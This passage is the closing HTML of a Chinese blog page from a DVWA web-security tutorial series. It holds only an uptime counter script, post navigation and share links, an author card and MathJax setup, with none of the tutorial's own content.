        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
    } 
setInterval("createtime()",250);
</script>
</footer>

            </div>
            
                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
                    <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    
                <a class="post-action-btn btn btn--default tooltip--top" href="/2021/07/03/DVWA-%E5%9B%9B-%EF%BC%9AFile-Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/" data-tooltip="DVWA(四)：File-Inclusion（文件包含）" aria-label="上一篇: DVWA(四)：File-Inclusion（文件包含）">
                    
                        <i class="fa fa-angle-left" aria-hidden="true"></i>
                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
                    </a>
            </li>
            <li class="post-action">
                
                    
                <a class="post-action-btn btn btn--default tooltip--top" href="/2021/06/28/DVWA-%E4%B8%83-%EF%BC%9ASQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89/" data-tooltip="DVWA(七)：SQL-Injection（sql注入）" aria-label="下一篇: DVWA(七)：SQL-Injection（sql注入）">
                    
                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
                        <i class="fa fa-angle-right" aria-hidden="true"></i>
                    </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Diesen Beitrag teilen">
                <i class="fa fa-share-alt" aria-hidden="true"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yiwenzhe.com/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/&amp;title=DVWA(八)：SQL-Injection（Blind盲注）" title="分享到 QQ" aria-label="分享到 QQ" rel="external nofollow noopener noreferrer">
                    <i class="fab fa-qq" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="_blank" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://yiwenzhe.com/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/" title="分享到 Qzone" aria-label="分享到 Qzone" rel="external nofollow noopener noreferrer">
                    <i class="fa fa-star" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="_blank" href="http://service.weibo.com/share/share.php?&amp;title=https://yiwenzhe.com/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/" title="分享到 Weibo" aria-label="分享到 Weibo" rel="external nofollow noopener noreferrer">
                    <i class="fab fa-weibo" aria-hidden="true"></i>
                </a>
            </li>
        
        
            
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="目录">
            
                <i class="fa fa-list" aria-hidden="true"></i>
            </a>
        </li>
    </ul>
</div>


                </div>
                
    <div id="share-options-bar" class="share-options-bar" data-behavior="4">
        <i id="btn-close-shareoptions" class="fa fa-times"></i>
        <ul class="share-options">
            
                
                
                <li class="share-option">
                    <a class="share-option-btn" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yiwenzhe.com/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/&amp;title=DVWA(八)：SQL-Injection（Blind盲注）" aria-label="分享到 QQ" rel="external nofollow noopener noreferrer">
                        <i class="fab fa-qq" aria-hidden="true"></i><span>分享到 QQ</span>
                    </a>
                </li>
            
                
                
                <li class="share-option">
                    <a class="share-option-btn" target="_blank" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://yiwenzhe.com/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/" aria-label="分享到 Qzone" rel="external nofollow noopener noreferrer">
                        <i class="fa fa-star" aria-hidden="true"></i><span>分享到 Qzone</span>
                    </a>
                </li>
            
                
                
                <li class="share-option">
                    <a class="share-option-btn" target="_blank" href="http://service.weibo.com/share/share.php?&amp;title=https://yiwenzhe.com/2021/06/28/DVWA-%E5%85%AB-%EF%BC%9ASQL-Injection%EF%BC%88Blind%E7%9B%B2%E6%B3%A8%EF%BC%89/" aria-label="分享到 Weibo" rel="external nofollow noopener noreferrer">
                        <i class="fab fa-weibo" aria-hidden="true"></i><span>分享到 Weibo</span>
                    </a>
                </li>
            
        </ul>
    </div>


            
        </div>
        


    
        
    

<div id="about">
    <div id="about-card">
        <div id="about-btn-close">
            <i class="fa fa-times"></i>
        </div>
        
            <a href="https://yiwenzhe.com">
            <img id="about-card-picture" src="/assets/images/picture.jpg" alt="作者的图片">
            </a>
        
            <a href="https://yiwenzhe.com">
            <h4 id="about-card-name">YWZ</h4>
            </a>
        
            <div id="about-card-bio"><p>一个无聊的程序员</p>
</div>
        
        
            <div id="about-card-job">
                <i class="fa fa-briefcase"></i>
                <br>
                <p>武汉大学在读研究生</p>

            </div>
        
        
            <div id="about-card-location">
                <i class="fa fa-map-marker-alt"></i>
                <br>
                湖北武汉
            </div>
        
    </div>
</div>

        
        
<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
        <!--SCRIPTS-->

<script src="/assets/js/script-mxznsv1n7nz3zrfuls87amiraudckgmxncavgf1ucci53txgionftndw0zwt.min.js"></script>

<!--SCRIPTS END-->


    




    <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
</body>
</html>
